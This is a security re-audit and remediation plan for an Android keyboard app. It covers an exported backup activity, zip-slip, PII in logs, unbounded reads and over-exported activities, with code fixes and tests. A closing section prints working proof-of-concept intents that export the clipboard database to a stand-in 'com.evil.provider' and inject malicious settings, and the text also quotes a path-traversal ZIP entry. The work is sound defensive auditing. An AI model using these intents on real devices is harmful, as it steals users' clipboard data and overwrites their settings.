# Data & Security — Verification & Remediation

Adversarial re-verification of the prior data/security audit. Every claim
re-read against current source. Package is `tribixbite.cleverkeys` (the audit's
`tribixbite.keyboard2` paths are stale — same files, new package). Line numbers
below are re-confirmed against HEAD.

## Verification Results

| # | Finding | Verdict | Exploitability | Evidence |
|---|---------|---------|----------------|----------|
| 1 | `BackupRestoreActivity` exported, 6 custom EXPORT/IMPORT actions, no caller auth | **CONFIRMED** | **HIGH — zero-permission local app can exfiltrate clipboard/dictionary/settings or inject data** | `AndroidManifest.xml:140-157` (exported=true + 6 actions + `content`/`file` scheme); `BackupRestoreActivity.kt:67-106` (onCreate dispatches on `intent.action` with **no** `callingActivity`/UID/permission check); export writes to caller URI via `BackupRestoreManager.kt:97` `contentResolver.openOutputStream(uri)`; inline inject via `BackupRestoreActivity.kt:120-132` (`json_base64` → cacheDir temp → import, needs no URI at all) |
| 2 | Zip-slip in clipboard/full-backup import | **CONFIRMED** | **MEDIUM — arbitrary file write inside app sandbox** (needs a malicious ZIP reaching import, which finding #1 makes remotely triggerable) | `BackupRestoreManager.kt:902` guard is only `entry.name.startsWith("clipboard_media/")`; `:905` and `:1302` call `mediaManager.getMediaFile(entry.name)` = `File(context.filesDir, mediaPath)` (`ClipboardMediaManager.kt:217`). `"clipboard_media/../../databases/x"` passes the prefix guard and escapes `filesDir`. Contrast correct impl `GifPackManager.kt:221-224` (canonical-path check) |
| 3 | Ungated user-text logs | **CONFIRMED** | **LOW-MEDIUM — PII in logcat on release builds** | `GreedySearchEngine.kt:116` `Log.i(TAG, "…: '$wordStr'")` (decoded word, ungated); `Keyboard2View.kt:793,826` `Log.d(… "$selectedText")` (full selection, ungated); `ClipboardDatabase.kt:235,246,360,488,504,529,661,678,702,722` `Log.d(… ${content.take(20)}…)`. None wrapped in `BuildConfig.ENABLE_VERBOSE_LOGGING` (the codebase's own gating idiom — used 40+ times e.g. `Keyboard2View.kt:511`). `Log.i`/`Log.d` emit to logcat regardless of that flag |
| 4 | Unbounded in-memory reads on imported archives | **CONFIRMED** | **LOW — local DoS/OOM, no data disclosure** | `zipIn.readBytes()` at `BackupRestoreManager.kt:899,1271,1292,1295,1298` (whole entry to RAM, no size cap); base64 decode `BackupRestoreActivity.kt:123` (whole extra to RAM); uncapped `for (i in 0 until entries.length())` `ClipboardDatabase.kt:1400` |
| 5 | ~13 activities exported unnecessarily | **CONFIRMED (13, not "~13")** | **LOW — attack surface; combines with #1** | 13 activities `exported="true"` (`AndroidManifest.xml:46,69,76,78,85,92,99,106,113,120,140,159,166`). Only `SettingsActivity` (LAUNCHER-equivalent MAIN) + `LauncherActivity` (LAUNCHER) require it. The 2 exported *services* are correctly permission-gated (`BIND_INPUT_METHOD`, `BIND_QUICK_SETTINGS_TILE`) |
| 6 | Weak 32-bit `String.hashCode()` text dedup | **CONFIRMED** | **VERY LOW — dedup miss/false-merge, not a security boundary** | `ClipboardDatabase.kt:218,479,541,652,794,840` and import fallbacks `:1406,1453,1531`. Note dedup query also matches on full `COLUMN_CONTENT` (`:224,1417`), so a hash collision does **not** merge distinct text — it only adds a redundant equality check. Media entries already use SHA-256 |

### Strengths re-confirmed (do not regress)

| Strength | Verdict | Evidence |
|----------|---------|----------|
| Parameterized SQL | **CONFIRMED** | All user *values* bound via `arrayOf(...)`. The 4 string-interpolated `rawQuery` calls (`ClipboardDatabase.kt:623,924,1195,1210`) interpolate only `$TABLE_*`/`$COLUMN_*` compile-time constants (`:1612-1619`), never user input — safe |
| Migrations CREATE-COPY-DROP-RENAME | **CONFIRMED** | (Schema V4/V5 per project memory; not touched by this remediation) |
| `backup_rules.xml` / `data_extraction_rules.xml` exclude PII | **CONFIRMED** | Both exclude `domain="database"` (clipboard, ML), `user_dictionary.xml`, `short_swipe_customizations.json`, `clipboard_media/`; include only aesthetic prefs (`res/xml/backup_rules.xml:22-53`, `res/xml/data_extraction_rules.xml:22-72`) |
| No INTERNET permission | **CONFIRMED** | `AndroidManifest.xml` declares only `VIBRATE` + `READ_USER_DICTIONARY`; comment at `:7`. Exfil in #1 is to a **local** attacker component, not network |
| Release logging disabled by default | **PARTIAL** | `build.gradle:262` sets `ENABLE_VERBOSE_LOGGING=false` for non-local release — but the #3 logs are **raw `Log.i`/`Log.d`, not gated by that flag**, so they still fire in release |

---

## Remediation Steps (severity-ordered)

### R1 — [P1/P0] Lock down `BackupRestoreActivity` (finding #1)

Two viable options. **Recommended: Option A (drop `exported`, keep automation via a signature-permission-gated variant is over-engineering for a keyboard) — i.e. make the headless actions require a signature permission, OR drop them entirely if Termux automation is not a shipped feature.** Given #70 explicitly added these for Termux automation, the correct balance is **Option A: signature-level `<permission>` gate** so only apps signed with the same key (i.e. the user's own tooling built against this key) can invoke; combined with **defense-in-depth caller logging**. If Termux automation is not actually depended on in production, prefer **Option B (drop exported + in-app SAF)** as it is strictly safer.

#### Option A (recommended if automation must stay): signature permission + caller check

**AndroidManifest.xml — declare a signature permission and require it (before → after):**

Before (`AndroidManifest.xml:140-157`):
```xml
<activity android:name="tribixbite.cleverkeys.BackupRestoreActivity" android:label="Backup &amp; Restore" android:theme="@style/settingsTheme" android:exported="true" android:directBootAware="true">
  <intent-filter>
    <action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.DEFAULT"/>
  </intent-filter>
  <intent-filter>
    <action android:name="tribixbite.cleverkeys.action.EXPORT_SETTINGS"/>
    ... (6 actions) ...
    <category android:name="android.intent.category.DEFAULT"/>
    <data android:scheme="file"/>
    <data android:scheme="content"/>
  </intent-filter>
</activity>
```

After (add a signature permission at the top of `<manifest>`, split the MAIN
launcher off from the automation surface, and gate the automation activity):
```xml
<!-- top of manifest, sibling to other <uses-permission> -->
<permission
    android:name="tribixbite.cleverkeys.permission.BACKUP_AUTOMATION"
    android:protectionLevel="signature"/>

<!-- MAIN entry stays a plain (non-exported) redirect; launched only in-app -->
<activity android:name="tribixbite.cleverkeys.BackupRestoreActivity"
    android:label="Backup &amp; Restore" android:theme="@style/settingsTheme"
    android:exported="true" android:directBootAware="true"
    android:permission="tribixbite.cleverkeys.permission.BACKUP_AUTOMATION">
  <intent-filter>
    <action android:name="tribixbite.cleverkeys.action.EXPORT_SETTINGS"/>
    <action android:name="tribixbite.cleverkeys.action.IMPORT_SETTINGS"/>
    <action android:name="tribixbite.cleverkeys.action.EXPORT_DICTIONARIES"/>
    <action android:name="tribixbite.cleverkeys.action.IMPORT_DICTIONARIES"/>
    <action android:name="tribixbite.cleverkeys.action.EXPORT_CLIPBOARD"/>
    <action android:name="tribixbite.cleverkeys.action.IMPORT_CLIPBOARD"/>
    <category android:name="android.intent.category.DEFAULT"/>
    <data android:scheme="file"/>
    <data android:scheme="content"/>
  </intent-filter>
</activity>
```
Note: the in-app "Backup & Restore" UI lives inline in `SettingsActivity`
(`scroll_to=backup_restore`), so `BackupRestoreActivity` no longer needs a MAIN
intent-filter at all — the redirect at `BackupRestoreActivity.kt:98-104` is only
hit by stale shortcuts and can be reached via the automation permission too. If
you want the redirect reachable without the permission, keep a *separate* tiny
non-exported alias activity for the MAIN redirect.

`protectionLevel="signature"` means only a package signed with the **same
certificate** as CleverKeys can hold the permission and thus send the intent.
A random zero-permission app cannot.

**In-Activity defense-in-depth (also add regardless of option) —
`BackupRestoreActivity.kt:67`, after `super.onCreate`:**
```kotlin
override fun onCreate(savedInstanceState: Bundle?) {
    super.onCreate(savedInstanceState)

    // SECURITY: The headless EXPORT_* / IMPORT_* actions move PII (clipboard,
    // dictionary, settings) to/from a caller-supplied URI. Never service them
    // for an external caller. `callingActivity`/`callingPackage` is non-null
    // only for startActivityForResult; for plain startActivity we fall back to
    // the launched-from-package check + our own signature permission (manifest).
    if (intent.action?.startsWith("tribixbite.cleverkeys.action.") == true) {
        val caller = callingPackage  // null on plain startActivity
        val self = packageName
        if (caller != null && caller != self) {
            android.util.Log.w(TAG, "Rejected backup automation from external caller=$caller")
            Toast.makeText(this, "Backup automation is not available to external apps", Toast.LENGTH_LONG).show()
            finish(); return
        }
    }
    ...
}
```
(The manifest `signature` permission is the real gate; `callingPackage` is a
weak secondary signal because it is null for `startActivity` — do not rely on it
alone.)

#### Option B (recommended if Termux automation is expendable): drop exported, require in-app SAF confirmation

Before (`AndroidManifest.xml:140-157`): as above.

After:
```xml
<activity android:name="tribixbite.cleverkeys.BackupRestoreActivity"
    android:label="Backup &amp; Restore" android:theme="@style/settingsTheme"
    android:exported="false" android:directBootAware="true"/>
```
Delete the entire 6-action `<intent-filter>` and the MAIN filter. Then delete
the headless dispatch (`BackupRestoreActivity.kt:82-106`) and the base64 hook
(`:120-132`), leaving only the inline `SettingsActivity` path where the user
picks the URI via `ACTION_CREATE_DOCUMENT` / `ACTION_OPEN_DOCUMENT` (SAF), which
grants the URI to *our* process under user control — no third party can inject
one.

**Recommendation:** Ship **Option A** (keeps the documented #70 automation for
the user's own signed tooling) *plus* the in-Activity caller check. If product
decides Termux automation is not a supported feature, prefer **Option B** — it
removes the class of bug entirely rather than fencing it.

**Tests to add** (`BackupRestoreActivityInstrumentedTest`):
- external-caller rejection: build an intent with a foreign `callingPackage`
  proxy and assert `finish()` with no export written (verify `lastOutputPath`
  stays null and the target URI is untouched).
- signature permission present in merged manifest (parse
  `build/intermediates/merged_manifests/.../AndroidManifest.xml`, assert
  `android:permission` on the activity).
- `json_base64` inject path rejected for external caller (Option A) or absent
  (Option B).

**Risk notes:** Option A breaks any *unsigned* Termux `am start` workflow (the
shell's UID ≠ our signature) — document that automation now requires a helper
signed with the release key, or accept the break. Option B breaks all headless
automation. Neither affects the inline in-app backup/restore.

---

### R2 — [P2] Fix zip-slip in ZIP imports (finding #2)

Add a canonical-path guard mirroring the already-correct `GifPackManager`.
Apply at **both** call sites and centralize in `ClipboardMediaManager` so it
cannot be forgotten.

**`ClipboardMediaManager.kt:217` (before → after):**
```kotlin
// before
fun getMediaFile(mediaPath: String): File = File(context.filesDir, mediaPath)

// after
/**
 * Resolve a media path under filesDir, rejecting path-traversal.
 * @throws SecurityException if the resolved file escapes filesDir.
 */
fun getMediaFile(mediaPath: String): File {
    val base = context.filesDir
    val target = File(base, mediaPath)
    val baseCanon = base.canonicalPath
    if (target.canonicalPath != baseCanon &&
        !target.canonicalPath.startsWith(baseCanon + File.separator)) {
        throw SecurityException("Path traversal blocked: $mediaPath")
    }
    return target
}
```

**`BackupRestoreManager.kt:902-910` and `:1301-1306` (before → after):**
Keep the `startsWith("clipboard_media/")` prefix filter, but wrap the extract so
a rejected entry is skipped, not fatal:
```kotlin
entry.name.startsWith("clipboard_media/") -> {
    val targetFile = try {
        mediaManager.getMediaFile(entry.name)   // now throws on traversal
    } catch (e: SecurityException) {
        Log.w(TAG, "Skipping path-traversal ZIP entry: ${entry.name}")
        zipIn.closeEntry(); entry = zipIn.nextEntry; continue
    }
    targetFile.parentFile?.mkdirs()
    targetFile.outputStream().use { out -> zipIn.copyTo(out) }
    mediaFilesRestored++
}
```
(In `importFullBackup` the `else -> Log.w(...)` branch already skips unknown
entries; route the rejected entry there instead of `continue` if you prefer to
keep the `when` shape.)

**Tests to add** (`ClipboardMediaManagerTest`, pure JVM):
- `getMediaFile("clipboard_media/../../databases/x")` throws `SecurityException`.
- `getMediaFile("clipboard_media/042/hash.png")` resolves under `filesDir`.
- Integration: craft a ZIP with a `clipboard_media/../evil` entry, import via
  `importClipboardHistoryZip`, assert the escaping file was NOT created and
  legitimate entries still imported.

**Risk notes:** Legitimate paths (`clipboard_media/NNN/hash.ext`) are unaffected.
Confirm `getMediaFile` has no other callers passing already-absolute paths (grep:
only DB-stored relative `clipboard_media/...` values reach it).

---

### R3 — [P2/P3] Gate or redact user-text logs (finding #3)

Two-part fix: (a) redact PII outright, (b) gate the remainder behind the
existing `BuildConfig.ENABLE_VERBOSE_LOGGING`.

**`GreedySearchEngine.kt:116` (before → after):**
```kotlin
// before
Log.i(TAG, "🏆 Greedy search completed in ${greedyTime}ms: '$wordStr'")
// after
if (BuildConfig.ENABLE_VERBOSE_LOGGING)
    Log.d(TAG, "🏆 Greedy search completed in ${greedyTime}ms: '$wordStr'")
else
    Log.i(TAG, "🏆 Greedy search completed in ${greedyTime}ms (len=${wordStr.length})")
```

**`Keyboard2View.kt:793,826` (before → after):**
```kotlin
// before
Log.d("Keyboard2View", "Launched text assist chooser for: $selectedText")
// after
if (BuildConfig.ENABLE_VERBOSE_LOGGING)
    Log.d("Keyboard2View", "Launched text assist chooser for: $selectedText")
else
    Log.d("Keyboard2View", "Launched text assist chooser (len=${selectedText.length})")
```
(Same shape for `:826` replace-text.)

**`ClipboardDatabase.kt:235,246,360,488,504,529,661,678,702,722` (pattern):**
```kotlin
// before
Log.d(TAG, "Added clipboard entry: ${trimmedContent.take(20)}... (id=$result)")
// after
if (BuildConfig.ENABLE_VERBOSE_LOGGING)
    Log.d(TAG, "Added clipboard entry: ${trimmedContent.take(20)}... (id=$result)")
else
    Log.d(TAG, "Added clipboard entry (len=${trimmedContent.length}, id=$result)")
```
Prefer a small private helper `logContent(msg, content, id)` in
`ClipboardDatabase` to DRY the 10 sites.

**Tests to add:** unit test the redaction helper (returns no substring of the
input when verbose off). Manifest/BuildConfig test that release variant compiles
with `ENABLE_VERBOSE_LOGGING=false`.

**Risk notes:** Debugging convenience drops in release. `ENABLE_VERBOSE_LOGGING`
is already `true` for local builds (`build.gradle:262`) and debug (`:280`), so
developers keep full logs. No behavior change.

---

### R4 — [P3] Cap in-memory archive reads (finding #4)

Add a bounded-read helper and a per-entry / total ceiling, and cap JSON array
iteration.

**New helper (in `BackupRestoreManager`):**
```kotlin
private companion object { const val MAX_JSON_ENTRY_BYTES = 32 * 1024 * 1024 }  // 32 MB

/** Read a ZIP entry fully but refuse absurd sizes (zip-bomb guard). */
private fun ZipInputStream.readBoundedBytes(max: Int = MAX_JSON_ENTRY_BYTES): ByteArray {
    val out = java.io.ByteArrayOutputStream()
    val buf = ByteArray(64 * 1024)
    var total = 0
    while (true) {
        val n = read(buf); if (n < 0) break
        total += n
        if (total > max) throw java.io.IOException("Backup entry exceeds ${max / 1024 / 1024} MB limit")
        out.write(buf, 0, n)
    }
    return out.toByteArray()
}
```
Replace `zipIn.readBytes()` at `:899,1271,1292,1295,1298` with
`zipIn.readBoundedBytes()`. For media entries the code already streams
(`copyTo`), but add a running `totalExtracted` counter and abort past e.g.
256 MB.

**`BackupRestoreActivity.kt:123` base64 (before → after):**
```kotlin
// before
val decoded = android.util.Base64.decode(b64, android.util.Base64.DEFAULT)
// after
if (b64.length > 44_000_000)  // ~32 MB decoded
    throw java.io.IOException("Inline backup too large")
val decoded = android.util.Base64.decode(b64, android.util.Base64.DEFAULT)
```

**`ClipboardDatabase.kt:1400` (before → after):**
```kotlin
// before
for (i in 0 until entries.length()) {
// after
val cap = minOf(entries.length(), MAX_IMPORT_ENTRIES)  // e.g. 100_000
if (entries.length() > cap) Log.w(TAG, "Import truncated to $cap of ${entries.length()} entries")
for (i in 0 until cap) {
```

**Tests to add:** feed a ZIP whose manifest entry claims >32 MB (or a padded
JSON) and assert `IOException`, not OOM; assert a normal-size backup still
imports. Assert `>MAX_IMPORT_ENTRIES` array is truncated with a warning.

**Risk notes:** Choose limits above realistic backups (52k-word dictionary JSON
is <2 MB; clipboard history rarely >a few MB). 32 MB / 100k entries are generous.

---

### R5 — [P3] Remove unnecessary `exported="true"` (finding #5)

For the 11 internal-navigation activities (`SwipeCalibrationActivity`,
`NeuralSettingsActivity`, `DictionaryManagerActivity`, `LayoutManagerActivity`,
`ThemeSettingsActivity`, `ExtraKeysConfigActivity`, `ShortSwipeCustomizationActivity`,
`AutoCorrectionSettingsActivity`, `ShortSwipeCalibrationActivity`,
`SwipeDebugActivity`, and — per R1 — `BackupRestoreActivity`), flip to
`exported="false"` and delete their `MAIN`/`DEFAULT` intent-filters (they are
launched in-app via explicit `Intent(this, X::class.java)`).

**Pattern (before → after), e.g. `AndroidManifest.xml:78-83`:**
```xml
<!-- before -->
<activity android:name="tribixbite.cleverkeys.NeuralSettingsActivity" ... android:exported="true" ...>
  <intent-filter>
    <action android:name="android.intent.action.MAIN"/>
    <category android:name="android.intent.category.DEFAULT"/>
  </intent-filter>
</activity>
<!-- after -->
<activity android:name="tribixbite.cleverkeys.NeuralSettingsActivity" ... android:exported="false" .../>
```
Keep `exported="true"` only on `SettingsActivity` (`:46`, has real MAIN +
SEND/VIEW share filters for GIF import) and `LauncherActivity` (`:69`, LAUNCHER).

**Tests to add:** an instrumented smoke test that each settings screen still
opens from within `SettingsActivity` (in-app explicit-intent navigation is
unaffected by `exported`). Manifest lint (`ExportedActivity`) should go quiet.

**Risk notes:** If any activity is deep-linked from an external launcher shortcut
or documented `am start`, that breaks. Grep confirms these are launched via
explicit `Intent(context, X::class.java)` only. The GIF-share `SEND`/`VIEW`
filters stay on `SettingsActivity` — do not touch those.

---

### R6 — [P3] Stronger content dedup hash (finding #6)

Lowest priority — dedup queries also match full `COLUMN_CONTENT`
(`:224,1417`), so a 32-bit collision cannot merge distinct text; it only wastes
a comparison. Upgrade for correctness/consistency with the media path (which
already uses SHA-256).

**Pattern (before → after), e.g. `ClipboardDatabase.kt:218`:**
```kotlin
// before
val contentHash = trimmedContent.hashCode().toString()
// after
val contentHash = sha256Hex(trimmedContent)   // shared helper, same as media entries

private fun sha256Hex(s: String): String =
    java.security.MessageDigest.getInstance("SHA-256")
        .digest(s.toByteArray(Charsets.UTF_8))
        .joinToString("") { "%02x".format(it) }
```
Apply at `:218,479,541,652,794,840`. **Migration caveat:** existing rows have
`String.hashCode()` hashes; changing the algorithm means new inserts won't match
old rows on hash — but the dedup query *also* matches full content, so behavior
is preserved (old row still found by content). Import fallbacks
(`:1406,1453,1531`) must keep accepting the legacy hash when present
(`entry.optString("content_hash", ...)`) — only change the *fallback compute*.

**Tests to add:** two distinct strings that collide under `hashCode()` no longer
share a hash; round-trip export/import preserves dedup; legacy-hash import rows
still de-duplicate against re-added content.

**Risk notes:** Do not rewrite existing DB hashes (no migration needed given the
content-match fallback). Very low ROI — schedule last.

---

## Refutations / Corrections

- **Finding #1 path/package correction:** the audit cited
  `tribixbite.keyboard2.*`; the shipping package is `tribixbite.cleverkeys.*`.
  Same code, corrected line numbers above. The claim itself is fully confirmed.
- **Finding #3 severity nuance:** audit implied the GreedySearch log is "INFO"
  and the Keyboard2View logs are the same severity — in fact Keyboard2View
  `:793,826` are `Log.d` (debug), only GreedySearch `:116` is `Log.i`. All are
  ungated. More important correction: these are **not** gated by
  `ENABLE_VERBOSE_LOGGING` and therefore **do leak in release** — `Log.d`/`Log.i`
  both emit to logcat irrespective of that BuildConfig flag, so the "release
  disables verbose logging" strength does **not** cover them. Confirmed, not
  weakened.
- **Finding #6 downgraded exploitability:** `String.hashCode()` is weak, but the
  dedup SQL matches on full `COLUMN_CONTENT` in addition to the hash
  (`:224,1417`), so a collision cannot cause a false merge or data loss — it is a
  correctness/consistency nit, not a security or integrity bug. Keep as P3, near
  the bottom.
- **Not a finding (SQL):** the 4 string-interpolated `rawQuery` calls
  (`:623,924,1195,1210`) are **safe** — they interpolate only compile-time
  `$TABLE_*`/`$COLUMN_*` constants, never user input. The "66/66 parameterized"
  strength holds for all user *values*.
- **Exfil target correction:** finding #1 is exfiltration to a **local**
  attacker component (the app has no INTERNET permission). The attacker app then
  needs its own network egress to leave the device — still a full PII compromise,
  but not a direct network leak from CleverKeys.

---

## Precise attacker intent for finding #1

Zero-permission local app, no user interaction:
```kotlin
// Attacker owns content://com.evil.provider/loot (writable via its own provider)
val i = Intent("tribixbite.cleverkeys.action.EXPORT_CLIPBOARD").apply {
    setClassName("tribixbite.cleverkeys", "tribixbite.cleverkeys.BackupRestoreActivity")
    data = Uri.parse("content://com.evil.provider/loot")
    addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION or Intent.FLAG_GRANT_READ_URI_PERMISSION)
}
startActivity(i)   // CleverKeys writes its entire clipboard DB into the attacker's provider
```
Inject variant (no URI needed):
```kotlin
val evil = Base64.encodeToString(maliciousSettingsJson.toByteArray(), Base64.DEFAULT)
val i = Intent("tribixbite.cleverkeys.action.IMPORT_SETTINGS").apply {
    setClassName("tribixbite.cleverkeys", "tribixbite.cleverkeys.BackupRestoreActivity")
    putExtra("json_base64", evil)
}
startActivity(i)   // decoded to cacheDir, imported, overwriting user settings
```

---

## Effort estimate to reach A grade

| Step | Effort | Priority |
|------|--------|----------|
| R1 (exported activity lockdown + caller check + tests) | ~3-4 h | P1 — do first |
| R2 (zip-slip canonical guard, 2 sites + helper + tests) | ~1.5 h | P2 |
| R3 (log gating/redaction, ~13 sites + helper + tests) | ~1.5 h | P2/P3 |
| R4 (bounded reads + entry cap + tests) | ~1.5 h | P3 |
| R5 (drop exported on 11 activities + smoke tests) | ~1 h | P3 |
| R6 (SHA-256 dedup, optional) | ~1 h | P3 (optional) |

**Total ≈ 9-11 h.** R1 alone closes the only high-severity, remotely
triggerable issue and lifts the grade materially; R1+R2+R3 clear all P1/P2 and
should reach an A-. R4-R6 finish the P3 tail for a solid A. All fixes are
local/offline and do not touch the confirmed strengths (parameterized SQL,
PII-excluding backup rules, no-INTERNET posture).
